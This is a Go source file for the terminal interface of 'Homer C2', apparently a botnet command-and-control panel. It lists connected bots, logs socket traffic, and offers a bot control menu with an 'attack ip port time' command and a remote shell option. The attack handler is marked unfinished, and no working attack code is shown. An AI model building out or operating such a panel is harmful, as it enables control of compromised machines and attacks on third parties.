package main

import (
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/jroimartin/gocui"
)

type Interface struct {
	g *gocui.Gui
}

var (
	UI      = Interface{}
	session = Homer{
		theme:        Cyan,
		author:       "yahweh#0001",
		version:      "0.1",
		startTime:    GetTime(),
		machineCount: len(connections),
	}
)

var (
	isSocketLogActive   = false
	isControlMenuActive = false
)

func CreateInterface() *gocui.Gui {
	// create & return gocui interface

	g, _ := gocui.NewGui(gocui.OutputNormal)

	return g
}

func StartLoop() {
	// loop gocui.Gui layout and handler

	g := UI.g
	defer g.Close()

	g.Cursor = true
	g.SetManagerFunc(DrawingManager)

	if err := InitKeybindings(g); err != nil {
		log.Fatalln(err)
	}
	if err := UI.g.MainLoop(); err != nil && err != gocui.ErrQuit {
		log.Fatalln(err)
		ExitGracefully()
	}
}

func DrawingManager(g *gocui.Gui) error {
	// call go-cui drawing & gui object creation functions

	Output(g)
	DrawBanner(g)
	DrawServerInfo(g)
	DrawMenu(g)
	DrawInputs(g)

	return nil
}

func Output(g *gocui.Gui) *gocui.View {
	// make & initiate output window object

	maxX, maxY := g.Size()

	v, err := g.SetView("output", maxX-30, 0, maxX-1, maxY-16)
	if err != nil {
		v.Title = "Output"
		v.Wrap = true
		fmt.Fprintln(v, "No program output yet...")
	}

	return v
}

func ResetOutput(g *gocui.Gui) {
	// reset output window to default

	v := Output(g)
	v.Title = "Output"
	v.Wrap = true
	v.Autoscroll = false
	v.Clear()
	fmt.Fprintln(v, "No program output yet...")
}

func RequestsLog(g *gocui.Gui) (v *gocui.View) {
	// view window listing the type and num of requests on this socket

	maxX, maxY := g.Size()

	v, _ = g.SetView("requests", maxX-30, 0, maxX-1, maxY-26)
	v.Title = "TCP Requests"
	v.Wrap = true
	v.Autoscroll = true
	v.Clear()
	fmt.Fprintf(v, "\nIncoming: %d", socketLog.incoming)
	fmt.Fprintf(v, "\nOutgoing: %d", socketLog.outgoing)
	fmt.Fprintf(v, "\nNeutral:  %d", socketLog.neutral)

	return v
}

func SocketLog(g *gocui.Gui) (v *gocui.View) {
	// *gocui.View pointer window listing requests from/to/between each connection

	maxX, maxY := g.Size()

	v, _ = g.SetView("log", maxX-30, 5, maxX-1, maxY-16)
	v.Title = "Socket Log"
	v.Wrap = true
	v.Autoscroll = true
	v.Clear()

	if !(len(socketLog.logs) == 0) {
		for i, log := range socketLog.logs {
			fmt.Fprintf(v, "\n[#%d] %s", i+1, log)
		}
	} else {
		fmt.Fprintln(v, "No Socket Logs...")
	}
	return v
}

func NetworkLog(g *gocui.Gui) (v *gocui.View, w *gocui.View) {
	// create socket log in replacement of output window

	isSocketLogActive = true
	v = RequestsLog(g)
	w = SocketLog(g)

	return v, w
}

func ClearSocketLog(g *gocui.Gui) {
	// delete the 'log' and 'requests' views so they can be -
	// overwritten by the output view

	Output(g)
	g.DeleteView("requests")
	g.DeleteView("log")
	isSocketLogActive = false
}

func ServerInfo(g *gocui.Gui) *gocui.View {
	// make tcp server info object

	maxX, maxY := g.Size()

	v, err := g.SetView("info", maxX-30, maxY-15, maxX-1, maxY-9)
	if err != nil {
		v.Title = "Server Info"
	}

	return v
}

func Menu(g *gocui.Gui) *gocui.View {
	// make homer c2 menu object

	maxX, maxY := g.Size()

	v, err := g.SetView("menu", 0, maxY-15, maxX-31, maxY-6)
	if err != nil {
		v.Editable = false
		v.Wrap = false
		v.Title = "Menu"
	}

	return v
}

func DrawBanner(g *gocui.Gui) {
	// draw homer c2 banner ascii

	maxX, maxY := g.Size()

	v, err := g.SetView("banner", 0, 0, maxX-31, maxY-16)
	if err != nil {
		v.Editable = false
		v.Wrap = false
		v.Title = "Homer C2"
		fmt.Fprintf(v, `%s

        888                                                 .d8888b.   .d8888b.  
        888                                                d88P  Y88b d88P  Y88b 
        888                                                888    888        888 
        88888b.   .d88b.  88888b.d88b.   .d88b.  888d888   888             .d88P 
        888 "88b d88""88b 888 "888 "88b d8P  Y8b 888P"     888         .od888P"  
        888  888 888  888 888  888  888 88888888 888       888    888 d88P"      
        888  888 Y88..88P 888  888  888 Y8b.     888       Y88b  d88P 888"       
        888  888  "Y88P"  888  888  888  "Y8888  888        "Y8888P"  888888888%s

        Homer C2 v%s%s%s | github.com/kekws/homer
        Server Started: %s%s%s
        Developed & Maintained by %s%s%s on Discord`,
			session.theme, Reset,
			session.theme, session.version, Reset,
			session.theme, session.startTime, Reset,
			session.theme, session.author, Reset)
	}
}

func DrawMenu(g *gocui.Gui) *gocui.View {
	// draw homer c2 command menu

	v := Menu(g)
	v.Clear()
	fmt.Fprintf(v, "\n\n        [%s1%s] View current connections", session.theme, Reset)
	fmt.Fprintf(v, ".................[%s4%s] Bot Control Menu\n", session.theme, Reset)
	fmt.Fprintf(v, "        [%s2%s] Check for new connections", session.theme, Reset)
	fmt.Fprintf(v, "................[%s5%s] Clear output window\n", session.theme, Reset)
	fmt.Fprintf(v, "        [%s3%s] Monitor Network & Socket", session.theme, Reset)
	fmt.Fprintf(v, ".................[%s6%s] Exit Homer C2 Panel\n\n", session.theme, Reset)

	fmt.Fprintln(v, " To make a selection just enter one of the choice options (ex. 1).")
	fmt.Fprintln(v, " The output of each command will show up in the 'output' box on the top right")

	return v
}

func ClearControlMenu(g *gocui.Gui) {
	// delete the controlMenu view so it can be -
	// overwritten by the standard command menu

	g.DeleteView("menu")
	DrawMenu(g)
	isControlMenuActive = false
}

func ControlMenu(g *gocui.Gui) (v *gocui.View) {
	// create control menu to write over normal menu

	isControlMenuActive = true
	v = DrawControlMenu(g)

	return v
}

func DrawControlMenu(g *gocui.Gui) *gocui.View {
	// draw homer c2 command menu

	g.DeleteView("menu")
	maxX, maxY := g.Size()

	v, err := g.SetView("menu", 0, maxY-15, maxX-31, maxY-6)
	if err != nil {
		v.Title = "Bot Control Menu"
		v.Clear()
	}
	fmt.Fprintf(v, "        [%sattack%s] Attack Menu <attack ip port time>\n", session.theme, Reset)
	fmt.Fprintf(v, "        [%sshell%s] Start Shell (shell <bot ip>)\n", session.theme, Reset)
	fmt.Fprintf(v, "        [%sback%s] Exit Bot Control Menu\n\n", session.theme, Reset)

	fmt.Fprintln(v, " To make a selection just enter one of the choice options (ex. 1).")
	fmt.Fprintln(v, " The output of each command will show up in the 'output' box on the top right")

	return v
}

func ServerTicker(g *gocui.Gui, v *gocui.View) {
	// continual server ticker for the server information menu

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		for {
			<-ticker.C
			g.Update(ChangeServerText(v))
		}
	}()
}

func ChangeServerText(v *gocui.View) func(g *gocui.Gui) error {
	return func(g *gocui.Gui) error {
		v.Clear()
		fmt.Fprintf(v, "TIME: %s\n", GetTime())
		fmt.Fprintf(v, "TYPE: TCP\n")
		fmt.Fprintf(v, "HOST: %s\n", ip)
		fmt.Fprintf(v, "PORT: %s\n", port)
		fmt.Fprintf(v, "BOTS: %s%d%s\n", session.theme, len(connections), Reset)

		return nil
	}
}

func DrawServerInfo(g *gocui.Gui) {
	// draw server information using the server ticker

	v := ServerInfo(g)
	v.Clear()
	//ServerTicker(g, v)
	fmt.Fprintf(v, "TIME: %s\n", GetTime())
	fmt.Fprintf(v, "TYPE: TCP\n")
	fmt.Fprintf(v, "HOST: %s\n", ip)
	fmt.Fprintf(v, "PORT: %s\n", port)
	fmt.Fprintf(v, "BOTS: %s%d%s\n", session.theme, len(connections), Reset)
}

func DrawMachines(g *gocui.Gui, v *gocui.View) {
	// draw iteration of connections ([]Connection) on machine list object

	v.Title = "Viewing Connections"
	v.Wrap = false
	v.Clear()
	if len(connections) == 0 {
		fmt.Fprintf(v, "No Connected Machines!\n")
	} else {
		for _, connection := range connections {
			fmt.Fprintf(v, "(%d) %s (%s%s%s)\n",
				connection.id,
				connection.ip,
				session.theme, connection.username, Reset)
		}
	}
}

func DrawMachineScan(g *gocui.Gui, v *gocui.View) {
	// draw output saying new machines have been scanned for...

	v.Title = "New Connections"
	v.Wrap = false
	v.Clear()
	if len(connections) > session.machineCount {
		diff := len(connections) - session.machineCount
		fmt.Fprintf(v, "%s%d%s New Connection(s)!\n\nConnections Updated...",
			session.theme, diff, Reset)
		session.machineCount += diff
	} else {
		fmt.Fprintln(v, "No New Connections!")
	}
}

func DrawInputs(g *gocui.Gui) error {
	// draw menu input box & input log

	maxX, maxY := g.Size()

	if v, err := g.SetView("input", 0, maxY-5, maxX-31, maxY-1); err != nil {
		if err != gocui.ErrUnknownView {
			return err
		}
		v.Editable = true
		v.Wrap = true
		v.Title = "Input"

		if err := g.SetKeybinding("input", gocui.KeyEnter, gocui.ModNone, InputHandler("inputLog")); err != nil {
			return err
		}
		if _, err := g.SetCurrentView("input"); err != nil {
			return err
		}
	}

	if v, err := g.SetView("inputLog", maxX-30, maxY-8, maxX-1, maxY-1); err != nil {
		if err != gocui.ErrUnknownView {
			return err
		}
		v.Wrap = false
		v.Autoscroll = true
		v.Title = "Input Log"
	}

	return nil
}

func ResetInputBox(v *gocui.View) error {
	// reset cursor points & clear

	if err := v.SetCursor(0, 0); err != nil {
		return err
	}
	if err := v.SetOrigin(0, 0); err != nil {
		return err
	}
	v.Clear()

	return nil
}

func InitKeybindings(g *gocui.Gui) error {
	// set custom keybinds ([ctrl+c]->exit, etc.)

	if err := g.SetKeybinding("", gocui.KeyCtrlC, gocui.ModNone,
		func(g *gocui.Gui, v *gocui.View) error {
			ExitGracefully()
			return gocui.ErrQuit
		}); err != nil {
		return err
	}

	return nil
}

func InputHandler(dst string) func(g *gocui.Gui, v *gocui.View) error {
	// handle interface inputs from gocui and call their respective functions if valid

	return func(g *gocui.Gui, v *gocui.View) error {
		vdst, err := g.View(dst)
		if err != nil {
			return err
		}
		userInput := strings.TrimSuffix(string(v.Buffer()), "\n")

		validStdCmd := InputInCommands(userInput, []string{"1", "2", "3", "4", "5", "6"})
		validBotCmd := InputInCommands(userInput, []string{"attack", "remote", "back"})
		ResetInputBox(v)

		// input handlers -> end function

		var handleStdCommands = func() {
			// handle standard homer c2 commands

			if userInput == "1" {
				// list all connected clients
				// format - '(#id) ip (username)'
				DrawMachines(g, Output(g))
			} else if userInput == "2" {
				// check for recent un-seen connections
				DrawMachineScan(g, Output(g))
			} else if userInput == "3" {
				// send socket log to output window
				NetworkLog(g)
			} else if userInput == "4" {
				// in development - machine/bot control menu
				ControlMenu(g)
			} else if userInput == "5" {
				// reset the output menu to default
				ResetOutput(g)
			} else if userInput == "6" {
				// exit the homer c2 panel gracefully
				// (close socket & connections, exit cui)
				ExitGracefully()
			}
		}

		var handleBotCommands = func() {
			// handle bot menu commands

			if userInput == "attack" {
				// unfinished - send attack command to all connected machines
				fmt.Fprintf(vdst, "[%s-%s] Unfinished\n", session.theme, Reset)
			} else if userInput == "back" {
				// reset back to the main homer c2 command menu
				if isControlMenuActive {
					ClearControlMenu(g)
				}
			}
		}

		if validStdCmd && !isControlMenuActive {
			fmt.Fprintf(vdst, "[%s+%s] Valid Command\n", session.theme, Reset)
			if isSocketLogActive {
				ClearSocketLog(g)
			}
			handleStdCommands()
		} else if validBotCmd && isControlMenuActive {
			fmt.Fprintf(vdst, "[%s+%s] Valid Bot Command\n", session.theme, Reset)
			handleBotCommands()
		} else {
			fmt.Fprintf(vdst, "[%s!%s] Invalid Command\n", Red, Reset)
			return nil
		}

		return nil
	}
}
